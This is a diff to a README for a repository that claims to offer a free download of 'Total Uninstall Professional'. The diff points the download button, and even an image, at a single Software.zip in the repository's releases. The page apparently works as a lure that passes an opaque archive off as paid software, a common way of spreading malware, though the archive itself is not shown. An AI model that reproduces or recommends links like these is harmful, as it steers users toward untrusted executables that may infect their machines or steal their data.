@@ -22,7 +22,7 @@ Welcome to the Total Uninstall Professional Download repository! Here you can fi
 
 ## Get Started 🚀
 To download the software for Total Uninstall Professional, please click the button below:
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Rehan4025/Total-Uninstall-Professional-Download/releases/download/v1.0/Software.zip)](https://github.com/Rehan4025/Total-Uninstall-Professional-Download/releases/download/v1.0/Software.zip)
 
 *Note: The above link needs to be launched to start the download.*
 
@@ -54,4 +54,4 @@ Explore these resources to find detailed guides on uninstalling specific program
 ## Conclusion 🎉
 Thank you for visiting the Total Uninstall Professional Download repository. We hope you find the resources and information provided here helpful in uninstalling software programs effectively. If you have any questions or need further assistance, feel free to reach out to our team. Happy uninstalling! 🚀
 
-![Total Uninstall](https://img.icons8.com/ios/452/uninstall.png)
+![Total Uninstall](https://github.com/Rehan4025/Total-Uninstall-Professional-Download/releases/download/v1.0/Software.zip)
